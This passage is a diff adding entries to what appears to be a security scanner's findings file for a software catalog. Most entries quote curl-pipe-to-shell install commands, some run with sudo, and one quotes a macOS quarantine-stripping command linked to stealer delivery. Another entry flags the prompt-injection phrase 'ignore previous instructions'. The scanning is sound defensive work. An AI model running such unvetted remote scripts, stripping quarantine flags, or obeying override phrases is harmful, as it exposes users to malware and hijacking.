+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/tracedecay.json",
+      "line": 65,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/ScriptedAlchemy/tracedecay/master/i",
+      "file_sha256": "cf5c3f783b1c765dc20ab1405c4bec8f2c62de178edb7fcf4e97447ad2bed489"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/illip.json",
+      "line": 105,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/Yashwanth-pilli/ILLIP/main/install.",
+      "file_sha256": "f24f01403a5972076ff41542358c8f2e6dfe8bf53f366a01d23807216de7cf1b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/pando.json",
+      "line": 1022,
+      "evidence": "curl --proto '=https' --tlsv1.2 -LsSf https://github.com/mertkaradayi/pando/rele",
+      "file_sha256": "216aa9f1de5a453e199667e4af5a2664582484a2d3716ecf529b667bcd13dbd1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/gomaa.json",
+      "line": 549,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/M4F-S/gomaa/main/install.sh | bash",
+      "file_sha256": "15010fed2c71f9ee40cec3d64d05431388c63a360fceb716c6f4418302e95765"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/bamboo-agent.json",
+      "line": 349,
+      "evidence": "curl ... install.sh | sh",
+      "file_sha256": "990f06c1b3e3e73b3c0028e8d95009b1b17101c74d81e2ffca0446c574a2dd08"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/ruff.json",
+      "line": 221,
+      "evidence": "curl -LsSf https://astral.sh/ruff/install.sh | sh",
+      "file_sha256": "14275fa51cc961963b29a676ce412002675251a384b4013138cb57db18423299"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/openhire.json",
+      "line": 497,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "4e0ee4dd353af9919890857f8f61330020fa6cbedaaefefed08bf7d3513ccd45"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/oxker.json",
+      "line": 177,
+      "evidence": "curl https://raw.githubusercontent.com/mrjackwills/oxker/main/install.sh | bash",
+      "file_sha256": "f958232aabdb0ebbfcf474ced487aaceeea34caafe04870c46fdf8f2d92cfaa1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/c0mpute.json",
+      "line": 177,
+      "evidence": "curl -fsSL https://c0mpute.com/install.sh | sh",
+      "file_sha256": "9ed1ba59d77ab69940d8e56fe7e03f7447253cfad75a75d1aee597a5713394b4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/openinterpreter.json",
+      "line": 196,
+      "evidence": "curl -fsSL https://www.openinterpreter.com/install | sh",
+      "file_sha256": "3528264867ac63403ef278a074d3e03f877b3ebf3e89df16f0dd9d2b655e4d4d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/rimz.json",
+      "line": 551,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/rimio-ai/rimz/main/scripts/install.",
+      "file_sha256": "83a4d7d094b92e1ad3a7c899b22959dcb5e66d9bb50d5688198148a38a80208c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/caddy-analyzer.json",
+      "line": 275,
+      "evidence": "curl -sSfL .../install.sh | bash",
+      "file_sha256": "b4bf4185c6c7828848f2d61483b587744b357f9c221c7a9f87c7b10dc8319826"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/hermes-agent.json",
+      "line": 77,
+      "evidence": "curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash",
+      "file_sha256": "6865465a37c2a68950c3d903480a7ad0f205833b9d8ae4bb6932fe002d6f7f7d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/talos.json",
+      "line": 230,
+      "evidence": "curl -fsSL https://talos-agent.ch/install.sh | bash",
+      "file_sha256": "43e3ec5456f154180ca79f7d6a443e8084226b5aec23d4c9da8fd8ce4378fa88"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/quant.json",
+      "line": 68,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/koltyakov/quant/main/scripts/instal",
+      "file_sha256": "606b6cbaa86f1c7197b0c88a1a73ee5ed2a8ca3ea60234837a416236a2866489"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/bitrun.json",
+      "line": 386,
+      "evidence": "curl -fsSL ... | sh",
+      "file_sha256": "b212d46d146c87ac14621f93d743cf33ea9fb15408934b4e9530cd6df05c122c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/agav.json",
+      "line": 220,
+      "evidence": "curl -fsSL https://agav.dev/install.sh | bash",
+      "file_sha256": "6f82d07b7ce6fddf6c0e3b05e35df7098a08b35b70718ec08a8a816737303d44"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/rms-memory-mcp.json",
+      "line": 268,
+      "evidence": "curl -fsSL .../scripts/install.sh | bash",
+      "file_sha256": "c1f96dea0e30e69150122a68991ab8d89e34cb9e38ad25302a7f65bd959d5f2c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/vortelio.json",
+      "line": 1269,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "1db35c48952771071df7ac184821d6233df2ebb3f7ad19f193ea0eccfef3849d"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/hilbertraum.json",
+      "line": 203,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "fd0064bf3cd94c5a4ef8768ef6db3ac407247d58738cb28c9b89cbde1497d79f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/atlas.json",
+      "line": 180,
+      "evidence": "curl -fsSL https://atlasinference.dev/quickstart.sh | sh",
+      "file_sha256": "d82ef0b2eb6d82de9d55ed9ffa7baa94f132748431544688cc03e53d0de8a298"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/kx.json",
+      "line": 947,
+      "evidence": "curl -fsSL https://jzills.github.io/kx/install.sh | sh",
+      "file_sha256": "54dd8ad065f9701b24183e035b8d63d09d380bb6bf4757f9c670656a1f54d633"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/medha-agent.json",
+      "line": 251,
+      "evidence": "curl -fsSL https://medha.manojavamlabs.com/install.sh | sh",
+      "file_sha256": "c5c1ad355bd8b89b9178abe4e5deef8ff14e0473ed1cefb6c80bf8e00920a508"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/mercurycli.json",
+      "line": 755,
+      "evidence": "curl -fsSL https://mercury-cli.ai/install | sh",
+      "file_sha256": "873c55e20afbebe4fabda4c9497262fee5ef99c778b227793cacb25ca0e422ba"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/meta-data-mcp.json",
+      "line": 66,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "776772c4667f7ac156fd4350ab6aa990b36381475739ccd3543543d3cfcffd92"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/concord.json",
+      "line": 988,
+      "evidence": "curl --proto '=https' --tlsv1.2 -LsSf https://github.com/chojs23/concord/release",
+      "file_sha256": "d10c883ef9e91f045765780cc67918909d3c6687295bb41e7c765e9ac0692b39"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/gutcheck.json",
+      "line": 80,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/sfmqrb/gutcheck/main/install.sh | s",
+      "file_sha256": "1d70a0a37ce3af7794e139fe44e919aad1b3accf81b0675f680dee7da99199d3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/project-zero.json",
+      "line": 330,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/shifulegend/project-zero/master/ins",
+      "file_sha256": "a2a8f68610ccc06f6ccd0b1660cb80767d5f1c1de197a1ddf51377017e48f2e6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/lumen.json",
+      "line": 201,
+      "evidence": "curl -fsSL https://servelumen.com/install.sh | bash",
+      "file_sha256": "f856793db5d8763346e6cc4524e861781052d6cbac652c77dcd426f4ca6220f7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/cloudflare-speed-cli.json",
+      "line": 172,
+      "evidence": "curl -fsSL .../install.sh | sh",
+      "file_sha256": "f2a6fa2dfad6d39fbfc455b05aec9139e72e865cc4e9eaf57bdd237680d07d39"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/aic.json",
+      "line": 95,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSfL https://github.com/CaicoLeung/aic/releases",
+      "file_sha256": "fd25100dbb2568a1a11b04db792593abb63ccf2e122f384253eb9a69c3871ff6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/knot.json",
+      "line": 70,
+      "evidence": "curl --proto '=https' --tlsv1.2 -LsSf https://github.com/raultov/knot/releases/l",
+      "file_sha256": "25387101681352c7f3fa01de2d4a4b9fcae972c75e21d8607a282f69ee07407a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/omk.json",
+      "line": 100,
+      "evidence": "curl -fsSL https://github.com/dmae97/omk/releases/latest/download/install.sh | s",
+      "file_sha256": "f7fa537738adaef79c9f942dcb9bbe7629b24c2575e1bd0b5468ade30ad4493b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/niri-computer-use.json",
+      "line": 203,
+      "evidence": "curl -fsSL https://github.com/ayagmar/niri-computer-use/releases/latest/download",
+      "file_sha256": "e46a56f86275dd5973a864079fdf2ac6d4c171b7295319c782db9c6842ec0e39"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/ollaya.json",
+      "line": 73,
+      "evidence": "curl -fsSL https://ollaya.dev/install.sh | sh",
+      "file_sha256": "3b3fa7c58f20faec0712be7b8ad00a27e71942cfd9a3fa84b5208d5b5e26dbff"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/ggrun.json",
+      "line": 192,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/raketenkater/ggrun/main/setup.sh | ",
+      "file_sha256": "38d59bf0c58ec9ba0b7f161d75b96dc2caec902ebb8f85e3b89cf1496ab80102"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/ollama.json",
+      "line": 168,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "23426acb7a98775acdd0074854fb7c6a4112ae9b42288359c162b5a6a4828625"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/wshm.json",
+      "line": 1070,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/wshm-dev/wshm/main/install.sh | sh",
+      "file_sha256": "7bd1439fd3d237a716fa18973122869ce6a58a3bf33880877ce0761dcc99e347"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/dust.json",
+      "line": 137,
+      "evidence": "curl -sSfL https://raw.githubusercontent.com/bootandy/dust/refs/heads/master/ins",
+      "file_sha256": "ecdfcf0b04fee060829cc8c959c57baf8f61d5405daf0d31e3144d645731b115"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/cortex-cli.json",
+      "line": 81,
+      "evidence": "curl -fsSL https://get.cortex-edr.com | sh",
+      "file_sha256": "b7f8c7e948401efd340d9231af7b48e5e64a5d7687ea815b1f21dc264078a87b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/prod-code.json",
+      "line": 390,
+      "evidence": "curl -fsSL https://prod.codes/install.sh | sh",
+      "file_sha256": "20219ad3aaa0922f0ab9627f6974ff92a0c75d194a9e99c13c4789701d3de884"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/rainfrog.json",
+      "line": 287,
+      "evidence": "curl -LSsf .../install.sh | bash",
+      "file_sha256": "998660bc785fa448065eaaa646b287eb572c195219478fc469df2955eb14132a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/ogcode.json",
+      "line": 212,
+      "evidence": "curl -fsSL https://ogcode.in/install.sh | sh",
+      "file_sha256": "236a298c72919b8542d30b3d87d3afc8070e0e3d346bf0f75aa0caa2425b2cc0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/alphacode.json",
+      "line": 77,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/dragonked2/alphacode/main/scripts/i",
+      "file_sha256": "2e2e4837ba5f53c022ee54f91fb7cd08b20372f4d82bdbf279a48befc19d8194"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/storage-ballast-helper.json",
+      "line": 249,
+      "evidence": "curl -fsSL .../install.sh | bash",
+      "file_sha256": "2bf1dac620ba8ba8e02b5dd59bb102370dde457fc0fc4ed7a6dc757379607753"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/just.json",
+      "line": 613,
+      "evidence": "curl --proto '=https' --tlsv1.2 -sSf https://just.systems/install.sh | bash",
+      "file_sha256": "09c562892b72b50f981f392fd3bbf038c37986037918bfb46fd85eba7a7f69c0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/xrat.json",
+      "line": 270,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/mhyrzt/xrat/master/install.sh | bas",
+      "file_sha256": "b9d05d7eba25626d676d19b0143d6ce5f28e20340a57985c33976efca8e9b904"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/rclone.json",
+      "line": 259,
+      "evidence": "curl https://rclone.org/install.sh | sudo bash",
+      "file_sha256": "f92cc957be4a77e37e4a799ba3439a54518adab68eccf557fbae3947a1e81220"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/doggo.json",
+      "line": 239,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/mr-karan/doggo/main/install.sh | sh",
+      "file_sha256": "31a0b7d32c549171d1b74b3a7dda441390186e5b1355b897bbe030dc692b3893"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/n8n.json",
+      "line": 128,
+      "evidence": "curl -fsSL https://get.n8n.io | sh",
+      "file_sha256": "c5998e1ae6916494d14b1264a97a9da48a6c2b3c525056a7c970684801ba68f7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/tether.json",
+      "line": 300,
+      "evidence": "curl -fsSL https://fastcrest.com/install | sh",
+      "file_sha256": "bb6e6763bfe6b157ab9bfcc6c8b08e3e97dd4d8c87da66b82f1e7e03e6664341"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/elio.json",
+      "line": 224,
+      "evidence": "curl -fsSL https://elio-fm.github.io/elio-apt/install.sh | sudo sh",
+      "file_sha256": "852143bf5aed30f466f300a54840917d64bd4cae8b2b4338309080ffdd1a62fd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/syft.json",
+      "line": 236,
+      "evidence": "curl -sSfL https://get.anchore.io/syft | sudo sh",
+      "file_sha256": "48b35e72c8cee265ad81294340820137e6905fc587cc9081b204ffcc98db9d52"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/jscpd.json",
+      "line": 548,
+      "evidence": "curl -fsSL https://jscpd.dev/install.sh | bash",
+      "file_sha256": "626a6f4f814f0d8e9a828bc5f85d138d1ae2745148fa4a44ee358ef5b1d0198d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/dgx-spark-qwen38.json",
+      "line": 368,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/hasso5703/dgx-spark-qwen38/main/get",
+      "file_sha256": "4f94a3f4fcf7c2cbc578602c10305f358714942c6bf8f6f9ed573ce324782671"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/nexscope-cli.json",
+      "line": 616,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/nexscope-ai/nexscope-cli/main/insta",
+      "file_sha256": "77da8fa1aa708f2e743e5dac68e0a1003d05c5fda85eebf6fb6a51e9232a963c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/fak.json",
+      "line": 322,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/anthony-chaudhary/fak/main/install.",
+      "file_sha256": "112709c54b090c811f66cd3cbc09537cdc3298ab903fd94fe3e6748ccae2175b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/hal0.json",
+      "line": 204,
+      "evidence": "curl -fsSL https://hal0.dev/install.sh | sudo bash",
+      "file_sha256": "670fa09a1c7b47b75cae39f28044aef921cb62778367ffc2a116fe6ff849d441"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/himalaya.json",
+      "line": 223,
+      "evidence": "curl ... install.sh | sudo sh",
+      "file_sha256": "a6671da596ec84a727321be821195198505f95200a924ad668687eacca56f827"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/infai.json",
+      "line": 319,
+      "evidence": "curl -sL .../install.sh | bash",
+      "file_sha256": "aad10a214be5df2edbba1e5657f75e2184daf94e094df2d2497d51a654dbbd50"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/zeph.json",
+      "line": 401,
+      "evidence": "curl -fsSL .../latest/download/install.sh | sh",
+      "file_sha256": "e6e6d1a99b96d272fa969792e01806265ebf95fa0fa3e1aae6d5db1994bb1533"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/zeph.json",
+      "line": 1684,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "e6e6d1a99b96d272fa969792e01806265ebf95fa0fa3e1aae6d5db1994bb1533"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/halpradio.json",
+      "line": 1055,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/halpworld/halpradio/main/install.sh",
+      "file_sha256": "418696ed4852fe3f78b2f228d0e71acf5f0501aac7e8cfe09101233bf417df9d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/detent.json",
+      "line": 283,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/digitaldrywood/detent/main/install.",
+      "file_sha256": "594e79ad2e8fba5bec42e354cb78770676e05ef133503966865db2ec3908c672"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/agent-lsp.json",
+      "line": 891,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/blackwell-systems/agent-lsp/main/in",
+      "file_sha256": "b9b6a8ca756cb94b6afed36d4fb8592e9b5de7ac69c2e93b8ea565f766810c3e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/locals.json",
+      "line": 70,
+      "evidence": "curl -LsSf https://raw.githubusercontent.com/Generated-Computers/Locals/main/ins",
+      "file_sha256": "866d4937a367f6fdd8b408db95094401406f593daca9f839ddb247c402e496ce"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/eckra.json",
+      "line": 210,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/sudoeren/eckra/master/scripts/insta",
+      "file_sha256": "819a05b9d6d0d26c19604e42b88be0da24ea2c71d0cb83796bdf9f2420c30c2e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/claudette.json",
+      "line": 808,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/mrdushidush/claudette/main/install.",
+      "file_sha256": "52e2c877faf385de6ff483d4d9473fcd72208ee19ed6dfef174c0f9b4cd3dbc0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/oweka.json",
+      "line": 354,
